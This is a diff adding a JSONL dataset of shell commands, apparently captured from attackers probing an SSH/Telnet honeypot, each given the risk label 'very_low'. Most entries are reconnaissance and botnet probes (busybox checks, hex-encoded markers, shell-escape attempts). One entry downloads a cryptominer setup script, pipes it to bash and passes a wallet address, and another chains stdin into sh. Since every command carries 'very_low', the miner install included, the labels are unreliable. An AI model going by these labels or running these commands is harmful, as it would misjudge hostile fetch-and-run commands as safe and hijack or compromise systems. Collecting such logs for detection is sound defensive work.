@@ -1,0 +1,591 @@
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"lscpu | grep Model","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"lscpu | grep Model","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"cat \/proc\/mounts; \/bin\/busybox NDNYN","label":"very_low"}
+{"command":"tftp; wget; \/bin\/busybox NDNYN","label":"very_low"}
+{"command":"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s","label":"very_low"}
+{"command":"\/bin\/busybox NDNYN","label":"very_low"}
+{"command":"echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'","label":"very_low"}
+{"command":"echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'","label":"very_low"}
+{"command":"cat \/proc\/uptime","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"linuxshell","label":"very_low"}
+{"command":"\/bin\/busybox TSUNAMI","label":"very_low"}
+{"command":"\/bin\/busybox cat \/bin\/busybox","label":"very_low"}
+{"command":"echo -e \"\\x6F\\x6B\"","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"debug shell","label":"very_low"}
+{"command":"cmd","label":"very_low"}
+{"command":"wget --help >\/dev\/null && echo -e '\\x57\\x47\\x45\\x54\\x5f\\x46\\x4f\\x55\\x4e\\x44';curl --help >\/dev\/null && echo -e '\\x43\\x55\\x52\\x4c\\x5f\\x46\\x4f\\x55\\x4e\\x44';ftpget --help >\/dev\/null && echo -e '\\x46\\x54\\x50\\x5f\\x46\\x4f\\x55\\x4e\\x44'; echo -e '\\x45\\x43\\x48\\x4f\\x5f\\x46\\x4f\\x55\\x4e\\x44'","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"start","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"config terminal","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"linuxshell","label":"very_low"}
+{"command":"su","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"\/bin\/busybox wget;\/bin\/busybox echo -ne '\\x45\\x4c\\x46'","label":"very_low"}
+{"command":"echo -e '\\x79\\x65\\x73\\x68\\x65\\x6c\\x6f'","label":"very_low"}
+{"command":"cat \/bin\/echo","label":"very_low"}
+{"command":"cat \/proc\/mounts","label":"very_low"}
+{"command":"\/ip cloud print","label":"very_low"}
+{"command":"ifconfig","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo","label":"very_low"}
+{"command":"ps | grep '[Mm]iner'","label":"very_low"}
+{"command":"ps -ef | grep '[Mm]iner'","label":"very_low"}
+{"command":"ls -la \/dev\/ttyGSM* \/dev\/ttyUSB-mod* \/var\/spool\/sms\/* \/var\/log\/smsd.log \/etc\/smsd.conf* \/usr\/bin\/qmuxd \/var\/qmux_connect_socket \/etc\/config\/simman \/dev\/modem* \/var\/config\/sms\/*","label":"very_low"}
+{"command":"echo Hi | cat -n","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"lscpu | grep Model","label":"very_low"}
+{"command":"cat \/bin\/echo","label":"very_low"}
+{"command":"wget 2>&1;curl 2>&1;ftpget 2>&1","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/etc\/issue;","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"echo -e '\\x41\\x4b\\x34\\x37'","label":"very_low"}
+{"command":"find \/ -writable | head -n 1","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"cat \/proc\/mounts; \/bin\/busybox SCCGX","label":"very_low"}
+{"command":"tftp; wget; \/bin\/busybox SCCGX","label":"very_low"}
+{"command":"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s","label":"very_low"}
+{"command":"\/bin\/busybox SCCGX","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"lscpu | grep Model","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"lscpu | grep Model","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l | head -c 30","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"lscpu | grep Model","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/var\/tmp\/.var03522123 | head -n 1","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"lscpu | grep Model","label":"very_low"}
+{"command":"\/tmp\/ntpclient sftp.spc","label":"very_low"}
+{"command":"scp -t \/tmp\/Lhtln3CT","label":"very_low"}
+{"command":"(uname -smr || \/bin\/uname -smr || \/usr\/bin\/uname -smr)","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"ping;sh","label":"very_low"}
+{"command":"wget","label":"very_low"}
+{"command":"\/bin\/busybox;echo -e '\\147\\141\\171\\146\\147\\164'","label":"very_low"}
+{"command":"gayfgtmulti-callREPOR\/bin\/busybox;echo -e '\\147\\141\\171\\146\\147\\164'","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | cut -f2 -d: | uniq -c; nvidia-smi --list-gpus | grep 0 | cut -f2 -d: | uniq -c","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/var\/tmp\/.var03522123 | head -n 1","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"lscpu | grep Model","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"lscpu | grep Model","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"lscpu | grep Model","label":"very_low"}
+{"command":"echo A","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"lscpu | grep Model","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"help","label":"very_low"}
+{"command":"busybox","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"ls \/","label":"very_low"}
+{"command":"echo -n n06m5xox|md5sum;uname -a","label":"very_low"}
+{"command":"uname -s -v -n -r;nproc;","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"linuxshell","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"ls \/home","label":"very_low"}
+{"command":"\/bin\/busybox CORONA","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"linuxshell","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"\/bin\/busybox CORONA","label":"very_low"}
+{"command":"echo -n AfzDTzW4|md5sum","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"development","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"runshellcmd","label":"very_low"}
+{"command":"linuxshell","label":"very_low"}
+{"command":"runshellcmd","label":"very_low"}
+{"command":"start start-shell","label":"very_low"}
+{"command":"start-shell","label":"very_low"}
+{"command":"start-shell bash","label":"very_low"}
+{"command":"ping ; sh","label":"very_low"}
+{"command":"vshell","label":"very_low"}
+{"command":"exec shellconfig ","label":"very_low"}
+{"command":"config terminal","label":"very_low"}
+{"command":"busybox DNXFCOW","label":"very_low"}
+{"command":"\/bin\/busybox DNXFCOW","label":"very_low"}
+{"command":"\/bin\/busybox cat \/bin\/busybox || while read i; do \/bin\/busybox echo $i; done < \/bin\/busybox || \/bin\/busybox dd if=\/bin\/busybox bs=22 count=1","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"cat \/proc\/mounts; \/bin\/busybox JVWBU","label":"very_low"}
+{"command":"tftp; wget; \/bin\/busybox JVWBU","label":"very_low"}
+{"command":"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s","label":"very_low"}
+{"command":"\/bin\/busybox JVWBU","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"start","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"config terminal","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"linuxshell","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"echo -e '\\x65\\x70\\x6D\\x70\\x69'","label":"very_low"}
+{"command":"cat \/bin\/ls|more","label":"very_low"}
+{"command":"cat \/bin\/ls|head -n 1","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"\/bin\/busybox SATORI","label":"very_low"}
+{"command":"\/bin\/busybox cat \/bin\/busybox || while read i; do \/bin\/busybox echo ; done < \/bin\/busybox || \/bin\/busybox dd if=\/bin\/busybox bs=22 count=1","label":"very_low"}
+{"command":"apt update -y; apt install curl -y; cat \/etc\/issue; curl -s -L https:\/\/raw.githubusercontent.com\/C3Pool\/xmrig_setup\/master\/setup_c3pool_miner.sh | bash -s 49bGaMpdZtB5MqnyAwMk5u9bv3zjpyTE2RnQz2djYCm1goxkSkPuodnW8ayyjNLfLAA72Qm29uJT4RbxCAzbkVH6PxPAZZa;timeout 10 top","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"cat \/bin\/sh || cat \/bin\/busybox || cat \/bin\/bash","label":"very_low"}
+{"command":"echo -e '\\x79\\x65\\x73\\x68\\x65\\x6c\\x6f'","label":"very_low"}
+{"command":"cat $SHELL || while read i; do echo $i; done < $SHELL || dd if=$SHELL bs=22 count=1","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"echo -e '\\x79\\x65\\x73\\x68\\x65\\x6c\\x6f'","label":"very_low"}
+{"command":"cat \/bin\/echo","label":"very_low"}
+{"command":"\/ip cloud print","label":"very_low"}
+{"command":"ifconfig","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo","label":"very_low"}
+{"command":"echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'","label":"very_low"}
+{"command":"echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'","label":"very_low"}
+{"command":"echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'","label":"very_low"}
+{"command":"echo A","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"pwd","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"pwd","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"pwd","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"cd boot","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"cd opt","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"pwd","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"ps -a","label":"very_low"}
+{"command":"python","label":"very_low"}
+{"command":"cat \/etc\/issue","label":"very_low"}
+{"command":"screenfetch","label":"very_low"}
+{"command":"echo \"Z\"\"IGAZAGA148\"\"8\"\n cat \/dev\/stdin | sh\n #!\/usr\/bin\/sh\n #timeout=30\n killSTDIN() {\n processID=$(ps -u | grep -v 'grep' | grep cat | grep '\/dev\/stdin' | head -n 1 | awk -F ' ' '{ print $2 }');\n ps -u | grep -v grep | grep cat | grep \/dev\/stdin | head -n 1 | awk -F   { print $2 }\n $(kill -9 $processID);\n kill -9 $processID\n }\n endScript() {\n echo \"K\"\"G\"\"B\"\"_CLOSE\";\n $(exec 1>&-);\n exec 1 >& -\n killSTDIN;\n }\n start(){\n startResult=$(echo \"[\"\"[\"\"[\");\n echo [[[\n stopResult=$(echo \"]\"\"]\"\"]\");\n echo ]]]\n cmd=$(uname -a);\n uname -a\n echo $startResult$cmd$stopResult;\n }\n start;\n endScript;\n cat \/dev\/stdin | sh\n #!\/usr\/bin\/sh\n #timeout=30\n killSTDIN() {\n processID=$(ps -u | grep -v 'grep' | grep cat | grep '\/dev\/stdin' | head -n 1 | awk -F ' ' '{ print $2 }');\n ps -u | grep -v grep | grep cat | grep \/dev\/stdin | head -n 1 | awk -F   { print $2 }\n $(kill -9 $processID);\n kill -9 $processID\n }\n endScript() {\n echo \"K\"\"G\"\"B\"\"_CLOSE\";\n $(exec 1>&-);\n exec 1 >& -\n killSTDIN;\n }\n start(){\n startResult=$(echo \"[\"\"[\"\"[\");\n echo [[[\n stopResult=$(echo \"]\"\"]\"\"]\");\n echo ]]]\n cmd=$(id);\n id\n echo $startResult$cmd$stopResult;\n }\n start;\n endScript;\n cat \/dev\/stdin | sh\n #!\/usr\/bin\/sh\n #timeout=20\n killSTDIN() {\n processID=$(ps -u | grep -v 'grep' | grep cat | grep '\/dev\/stdin' | head -n 1 | awk -F ' ' '{ print $2 }');\n ps -u | grep -v grep | grep cat | grep \/dev\/stdin | head -n 1 | awk -F   { print $2 }\n $(kill -9 $processID);\n kill -9 $processID\n }\n endScript() {\n echo \"K\"\"G\"\"B\"\"_CLOSE\";\n $(exec 1>&-);\n exec 1 >& -\n killSTDIN;\n }\n start(){\n startResult=$(echo \"[\"\"[\"\"[\");\n echo [[[\n stopResult=$(echo \"]\"\"]\"\"]\");\n echo ]]]\n cmd='N\/A';\n if [ -f $(which uptime) ]; then\n which uptime\n cmd=$(uptime);\n uptime\n fi\n echo $startResult$cmd$stopResult;\n }\n start;","label":"very_low"}
+{"command":"while [ -d \/proc\/$PPID ]; do sleep 1;head -v -n 8 \/proc\/meminfo; head -v -n 2 \/proc\/stat \/proc\/version \/proc\/uptime \/proc\/loadavg \/proc\/sys\/fs\/file-nr \/proc\/sys\/kernel\/hostname; tail -v -n 16 \/proc\/net\/dev;echo '==> \/proc\/df <==';df;echo '==> \/proc\/who <==';who;echo '==> \/proc\/end <==';echo '##Moba##'; done","label":"very_low"}
+{"command":"lscpu","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"ps x","label":"very_low"}
+{"command":"lscpu","label":"very_low"}
+{"command":"clear","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":".\/new","label":"very_low"}
+{"command":".\/ninfo","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":".\/ninfols","label":"very_low"}
+{"command":"\/ip cloud print","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo","label":"very_low"}
+{"command":"ps | grep '[Mm]iner'","label":"very_low"}
+{"command":"ps -ef | grep '[Mm]iner'","label":"very_low"}
+{"command":"ls -la \/dev\/ttyGSM* \/dev\/ttyUSB-mod* \/var\/spool\/sms\/* \/var\/log\/smsd.log \/etc\/smsd.conf* \/usr\/bin\/qmuxd \/var\/qmux_connect_socket \/etc\/config\/simman \/dev\/modem* \/var\/config\/sms\/*","label":"very_low"}
+{"command":"echo Hi | cat -n","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"development","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"runshellcmd","label":"very_low"}
+{"command":"linuxshell","label":"very_low"}
+{"command":"runshellcmd","label":"very_low"}
+{"command":"start start-shell","label":"very_low"}
+{"command":"start-shell","label":"very_low"}
+{"command":"start-shell bash","label":"very_low"}
+{"command":"ping ; sh","label":"very_low"}
+{"command":"vshell","label":"very_low"}
+{"command":"exec shellconfig ","label":"very_low"}
